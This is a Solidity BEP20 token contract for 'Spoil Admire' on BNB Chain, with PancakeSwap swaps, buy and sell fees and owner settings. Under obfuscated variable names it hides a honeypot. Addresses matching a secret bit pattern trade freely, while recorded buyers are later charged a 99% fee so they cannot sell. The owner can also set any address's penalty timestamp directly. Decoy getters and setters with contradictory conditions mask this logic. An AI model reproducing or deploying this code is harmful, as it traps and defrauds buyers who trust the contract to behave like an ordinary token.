/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract SpoilAdmire is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Spoil Admire ";
    string constant _symbol = "SpoilAdmire";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private teamMarketingFeeSell;
    mapping(address => bool) private maxIsLimitFeeBurnLaunchedMarketing;
    mapping(address => bool) private isTeamMaxSwap;
    mapping(address => bool) private teamSellLimitLaunchedExemptWallet;
    mapping(address => uint256) private marketingFeeMinMode;
    mapping(uint256 => address) private txExemptModeMax;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private isAutoModeTeamLaunched = 0;
    uint256 private launchedLimitFeeBuy = 8;

    //SELL FEES
    uint256 private txSwapMinAutoMarketing = 0;
    uint256 private autoFeeExemptTeamTxBots = 8;

    uint256 private maxSwapTradingLaunched = launchedLimitFeeBuy + isAutoModeTeamLaunched;
    uint256 private liquidityMarketingSellLaunchedExemptTeam = 100;

    address private maxBuyBurnSwap = (msg.sender); // auto-liq address
    address private liquidityTxLaunchedMinTradingModeBuy = (0x15785377449cA875FbBeC406fFFFF7F5bDC16459); // marketing address
    address private swapLaunchedWalletModeLimitMarketingMax = DEAD;
    address private liquidityBuyTeamMarketing = DEAD;
    address private walletSwapBuyMaxReceiverFee = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private modeBuyBurnSell;
    uint256 private liquidityMinReceiverSwap;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private maxSwapWalletMode;
    uint256 private burnLiquidityBuyLaunched;
    uint256 private exemptMaxLimitAutoFeeMarketingSell;
    uint256 private swapTeamFeeBuySellLaunched;
    uint256 private sellLiquidityAutoWallet;

    bool private launchedLimitTxWalletMarketingSwap = true;
    bool private teamSellLimitLaunchedExemptWalletMode = true;
    bool private sellExemptFeeWallet = true;
    bool private tradingLiquidityAutoSwapTx = true;
    bool private launchedIsExemptMax = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private feeBuyAutoWallet = _totalSupply / 1000; // 0.1%

    
    bool private limitMinMaxReceiverTradingSwap;
    uint256 private exemptLaunchedTradingLiquidity;
    bool private burnTradingBotsMinAutoExemptMax;
    bool private modeSellTeamIsMarketingMaxTrading;
    uint256 private limitMaxLaunchedWallet;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        maxSwapWalletMode = true;

        teamMarketingFeeSell[msg.sender] = true;
        teamMarketingFeeSell[address(this)] = true;

        maxIsLimitFeeBurnLaunchedMarketing[msg.sender] = true;
        maxIsLimitFeeBurnLaunchedMarketing[0x0000000000000000000000000000000000000000] = true;
        maxIsLimitFeeBurnLaunchedMarketing[0x000000000000000000000000000000000000dEaD] = true;
        maxIsLimitFeeBurnLaunchedMarketing[address(this)] = true;

        isTeamMaxSwap[msg.sender] = true;
        isTeamMaxSwap[0x0000000000000000000000000000000000000000] = true;
        isTeamMaxSwap[0x000000000000000000000000000000000000dEaD] = true;
        isTeamMaxSwap[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return modeIsMarketingLaunchedAutoLiquidity(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return modeIsMarketingLaunchedAutoLiquidity(sender, recipient, amount);
    }

    function modeIsMarketingLaunchedAutoLiquidity(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = limitAutoModeLaunched(sender) || limitAutoModeLaunched(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                limitExemptMinBurn();
            }
            if (!bLimitTxWalletValue) {
                feeLimitMinBurn(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return marketingTeamExemptMin(sender, recipient, amount);}

        if (!teamMarketingFeeSell[sender] && !teamMarketingFeeSell[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || isTeamMaxSwap[sender] || isTeamMaxSwap[recipient], "Max TX Limit has been triggered");

        if (limitBuyReceiverMinBurn()) {txMaxBuyBotsReceiverSwapExempt();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = minBuyBurnTrading(sender) ? burnFeeModeWalletLaunchedSell(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function marketingTeamExemptMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function minBuyBurnTrading(address sender) internal view returns (bool) {
        return !maxIsLimitFeeBurnLaunchedMarketing[sender];
    }

    function walletSellModeLiquidityBuy(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            maxSwapTradingLaunched = autoFeeExemptTeamTxBots + txSwapMinAutoMarketing;
            return feeTxBuyIs(sender, maxSwapTradingLaunched);
        }
        if (!selling && sender == uniswapV2Pair) {
            maxSwapTradingLaunched = launchedLimitFeeBuy + isAutoModeTeamLaunched;
            return maxSwapTradingLaunched;
        }
        return feeTxBuyIs(sender, maxSwapTradingLaunched);
    }

    function burnFeeModeWalletLaunchedSell(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(walletSellModeLiquidityBuy(sender, receiver == uniswapV2Pair)).div(liquidityMarketingSellLaunchedExemptTeam);

        if (teamSellLimitLaunchedExemptWallet[sender] || teamSellLimitLaunchedExemptWallet[receiver]) {
            feeAmount = amount.mul(99).div(liquidityMarketingSellLaunchedExemptTeam);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function limitAutoModeLaunched(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function feeTxBuyIs(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = marketingFeeMinMode[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function feeLimitMinBurn(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        txExemptModeMax[exemptLimitValue] = addr;
    }

    function limitExemptMinBurn() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (marketingFeeMinMode[txExemptModeMax[i]] == 0) {
                    marketingFeeMinMode[txExemptModeMax[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(liquidityTxLaunchedMinTradingModeBuy).transfer(amountBNB * amountPercentage / 100);
    }

    function limitBuyReceiverMinBurn() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    launchedIsExemptMax &&
    _balances[address(this)] >= feeBuyAutoWallet;
    }

    function txMaxBuyBotsReceiverSwapExempt() internal swapping {
        uint256 amountToLiquify = feeBuyAutoWallet.mul(isAutoModeTeamLaunched).div(maxSwapTradingLaunched).div(2);
        uint256 amountToSwap = feeBuyAutoWallet.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = maxSwapTradingLaunched.sub(isAutoModeTeamLaunched.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(isAutoModeTeamLaunched).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(launchedLimitFeeBuy).div(totalETHFee);

        payable(liquidityTxLaunchedMinTradingModeBuy).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                maxBuyBurnSwap,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getMaxIsLimitFeeBurnLaunchedMarketing(address a0) public view returns (bool) {
            return maxIsLimitFeeBurnLaunchedMarketing[a0];
    }
    function setMaxIsLimitFeeBurnLaunchedMarketing(address a0,bool a1) public onlyOwner {
        if (a0 != liquidityTxLaunchedMinTradingModeBuy) {
            launchedIsExemptMax=a1;
        }
        maxIsLimitFeeBurnLaunchedMarketing[a0]=a1;
    }

    function getTxSwapMinAutoMarketing() public view returns (uint256) {
        if (txSwapMinAutoMarketing == launchedLimitFeeBuy) {
            return launchedLimitFeeBuy;
        }
        if (txSwapMinAutoMarketing != feeBuyAutoWallet) {
            return feeBuyAutoWallet;
        }
        return txSwapMinAutoMarketing;
    }
    function setTxSwapMinAutoMarketing(uint256 a0) public onlyOwner {
        if (txSwapMinAutoMarketing != launchedLimitFeeBuy) {
            launchedLimitFeeBuy=a0;
        }
        if (txSwapMinAutoMarketing == launchedLimitFeeBuy) {
            launchedLimitFeeBuy=a0;
        }
        if (txSwapMinAutoMarketing == txSwapMinAutoMarketing) {
            txSwapMinAutoMarketing=a0;
        }
        txSwapMinAutoMarketing=a0;
    }

    function getMaxSwapTradingLaunched() public view returns (uint256) {
        if (maxSwapTradingLaunched == maxSwapTradingLaunched) {
            return maxSwapTradingLaunched;
        }
        if (maxSwapTradingLaunched != autoFeeExemptTeamTxBots) {
            return autoFeeExemptTeamTxBots;
        }
        return maxSwapTradingLaunched;
    }
    function setMaxSwapTradingLaunched(uint256 a0) public onlyOwner {
        if (maxSwapTradingLaunched != autoFeeExemptTeamTxBots) {
            autoFeeExemptTeamTxBots=a0;
        }
        maxSwapTradingLaunched=a0;
    }

    function getLiquidityMarketingSellLaunchedExemptTeam() public view returns (uint256) {
        if (liquidityMarketingSellLaunchedExemptTeam != autoFeeExemptTeamTxBots) {
            return autoFeeExemptTeamTxBots;
        }
        return liquidityMarketingSellLaunchedExemptTeam;
    }
    function setLiquidityMarketingSellLaunchedExemptTeam(uint256 a0) public onlyOwner {
        if (liquidityMarketingSellLaunchedExemptTeam == maxSwapTradingLaunched) {
            maxSwapTradingLaunched=a0;
        }
        if (liquidityMarketingSellLaunchedExemptTeam == txSwapMinAutoMarketing) {
            txSwapMinAutoMarketing=a0;
        }
        liquidityMarketingSellLaunchedExemptTeam=a0;
    }

    function getTxExemptModeMax(uint256 a0) public view returns (address) {
            return txExemptModeMax[a0];
    }
    function setTxExemptModeMax(uint256 a0,address a1) public onlyOwner {
        txExemptModeMax[a0]=a1;
    }

    function getAutoFeeExemptTeamTxBots() public view returns (uint256) {
        if (autoFeeExemptTeamTxBots != txSwapMinAutoMarketing) {
            return txSwapMinAutoMarketing;
        }
        if (autoFeeExemptTeamTxBots != liquidityMarketingSellLaunchedExemptTeam) {
            return liquidityMarketingSellLaunchedExemptTeam;
        }
        if (autoFeeExemptTeamTxBots != launchedLimitFeeBuy) {
            return launchedLimitFeeBuy;
        }
        return autoFeeExemptTeamTxBots;
    }
    function setAutoFeeExemptTeamTxBots(uint256 a0) public onlyOwner {
        if (autoFeeExemptTeamTxBots == feeBuyAutoWallet) {
            feeBuyAutoWallet=a0;
        }
        autoFeeExemptTeamTxBots=a0;
    }

    function getLaunchedLimitTxWalletMarketingSwap() public view returns (bool) {
        return launchedLimitTxWalletMarketingSwap;
    }
    function setLaunchedLimitTxWalletMarketingSwap(bool a0) public onlyOwner {
        launchedLimitTxWalletMarketingSwap=a0;
    }

    function getTradingLiquidityAutoSwapTx() public view returns (bool) {
        if (tradingLiquidityAutoSwapTx != launchedIsExemptMax) {
            return launchedIsExemptMax;
        }
        if (tradingLiquidityAutoSwapTx == launchedIsExemptMax) {
            return launchedIsExemptMax;
        }
        return tradingLiquidityAutoSwapTx;
    }
    function setTradingLiquidityAutoSwapTx(bool a0) public onlyOwner {
        tradingLiquidityAutoSwapTx=a0;
    }

    function getMaxBuyBurnSwap() public view returns (address) {
        if (maxBuyBurnSwap == liquidityTxLaunchedMinTradingModeBuy) {
            return liquidityTxLaunchedMinTradingModeBuy;
        }
        if (maxBuyBurnSwap == walletSwapBuyMaxReceiverFee) {
            return walletSwapBuyMaxReceiverFee;
        }
        return maxBuyBurnSwap;
    }
    function setMaxBuyBurnSwap(address a0) public onlyOwner {
        if (maxBuyBurnSwap != liquidityTxLaunchedMinTradingModeBuy) {
            liquidityTxLaunchedMinTradingModeBuy=a0;
        }
        maxBuyBurnSwap=a0;
    }

    function getLiquidityTxLaunchedMinTradingModeBuy() public view returns (address) {
        if (liquidityTxLaunchedMinTradingModeBuy != swapLaunchedWalletModeLimitMarketingMax) {
            return swapLaunchedWalletModeLimitMarketingMax;
        }
        return liquidityTxLaunchedMinTradingModeBuy;
    }
    function setLiquidityTxLaunchedMinTradingModeBuy(address a0) public onlyOwner {
        if (liquidityTxLaunchedMinTradingModeBuy == maxBuyBurnSwap) {
            maxBuyBurnSwap=a0;
        }
        if (liquidityTxLaunchedMinTradingModeBuy == maxBuyBurnSwap) {
            maxBuyBurnSwap=a0;
        }
        liquidityTxLaunchedMinTradingModeBuy=a0;
    }

    function getMarketingFeeMinMode(address a0) public view returns (uint256) {
        if (a0 != maxBuyBurnSwap) {
            return isAutoModeTeamLaunched;
        }
        if (a0 == swapLaunchedWalletModeLimitMarketingMax) {
            return autoFeeExemptTeamTxBots;
        }
            return marketingFeeMinMode[a0];
    }
    function setMarketingFeeMinMode(address a0,uint256 a1) public onlyOwner {
        if (a0 == swapLaunchedWalletModeLimitMarketingMax) {
            liquidityMarketingSellLaunchedExemptTeam=a1;
        }
        marketingFeeMinMode[a0]=a1;
    }

    function getFeeBuyAutoWallet() public view returns (uint256) {
        if (feeBuyAutoWallet == txSwapMinAutoMarketing) {
            return txSwapMinAutoMarketing;
        }
        if (feeBuyAutoWallet != txSwapMinAutoMarketing) {
            return txSwapMinAutoMarketing;
        }
        if (feeBuyAutoWallet != autoFeeExemptTeamTxBots) {
            return autoFeeExemptTeamTxBots;
        }
        return feeBuyAutoWallet;
    }
    function setFeeBuyAutoWallet(uint256 a0) public onlyOwner {
        feeBuyAutoWallet=a0;
    }

    function getLaunchedIsExemptMax() public view returns (bool) {
        if (launchedIsExemptMax != sellExemptFeeWallet) {
            return sellExemptFeeWallet;
        }
        if (launchedIsExemptMax == sellExemptFeeWallet) {
            return sellExemptFeeWallet;
        }
        return launchedIsExemptMax;
    }
    function setLaunchedIsExemptMax(bool a0) public onlyOwner {
        if (launchedIsExemptMax != launchedIsExemptMax) {
            launchedIsExemptMax=a0;
        }
        if (launchedIsExemptMax == launchedLimitTxWalletMarketingSwap) {
            launchedLimitTxWalletMarketingSwap=a0;
        }
        if (launchedIsExemptMax != sellExemptFeeWallet) {
            sellExemptFeeWallet=a0;
        }
        launchedIsExemptMax=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}